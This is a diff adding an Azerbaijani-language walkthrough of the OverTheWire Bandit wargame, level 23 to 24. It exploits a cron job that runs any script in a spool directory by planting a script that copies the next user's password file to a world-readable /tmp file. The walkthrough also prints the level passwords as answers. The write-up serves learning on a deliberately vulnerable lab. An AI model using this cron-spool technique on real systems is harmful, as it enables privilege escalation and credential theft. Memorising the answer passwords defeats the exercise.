@@ -725,3 +725,69 @@ jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 ```
 
 - parolu copy edib çıxırıq `jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n`
+
+
+**Bandit [LEVEL 23->24](https://overthewire.org/wargames/bandit/bandit24.html)**
+![bandit leve23-24](https://i.imgur.com/vkrIhAL.png)
+```
+ssh bandit.labs.overthewire.org -p 2220 -l bandit23
+
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+```
+
+- Səviyyə 23 -> Səviyyə 24 səhifəsini oxuyaraq görə bilərik ki, biz yenə də düzgün cronjobu yoxlamağa başlamalıyıq.
+```
+bandit23@bandit:~$ ls -la /etc/cron.d
+total 28
+drwxr-xr-x 2 root root 4096 Dec 4 01:58 .
+drwxr-xr-x 88 root root 4096 Aug 3 09:58 ..
+-rw-r--r-- 1 root root 189 Jan 25 2017 atop
+-rw-r--r-- 1 root root 120 Oct 16 2018 cronjob_bandit22
+-rw-r--r-- 1 root root 122 Oct 16 2018 cronjob_bandit23
+-rw-r--r-- 1 root root 120 Oct 16 2018 cronjob_bandit24
+-rw-r--r-- 1 root root 102 Oct 7 2017 .placeholder
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+if [ "$i" != "." -a "$i" != ".." ];
+then
+echo "Handling $i"
+timeout -s 9 60 ./$i
+rm -f ./$i
+fi
+done
+```
+- Hər bir skripti “/var/spool/bandit24” proqramında yerinə yetirir (və sonra onları silir). Beləliklə, biz ora bandit24-parolunu oxuya biləcəyimiz “/tmp” faylına köçürən bir skript yerləşdirə bilərik:
+
+```
+vim /var/spool/bandit24/hackinganarchy.sh
+
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/hackinganarchy.txt
+chmod 444 /tmp/hackinganarchy.txt
+```
+
+- Bu qısa kiçik skript bandit24 parol faylının məzmununu “/tmp/hackinganarchy.txt” faylına köçürür və onu hər kəs üçün oxunaqlı edir.
+> Skriptin ilk sətri [Shebang](https://en.wikipedia.org/wiki/Shebang_(Unix)) adlanır.
+> O, faylı icra edərkən hansı interpreterin istifadə ediləcəyini linux kommand sətirinə bildirir.
+  
+- Onu işə salmazdan əvvəl icra edilə bilən hala gətirməliyik:
+
+`bandit23@bandit:~$ chmod 555 /var/spool/bandit24/hackinganarchy.sh`
+  
+- Cronjob işə salındıqdan sonra parolumuzu alacağıq:
+```
+bandit23@bandit:~$ cat /tmp/hackinganarchy.txt
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
+- parolu copy edib çıxırıq `UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ`
+
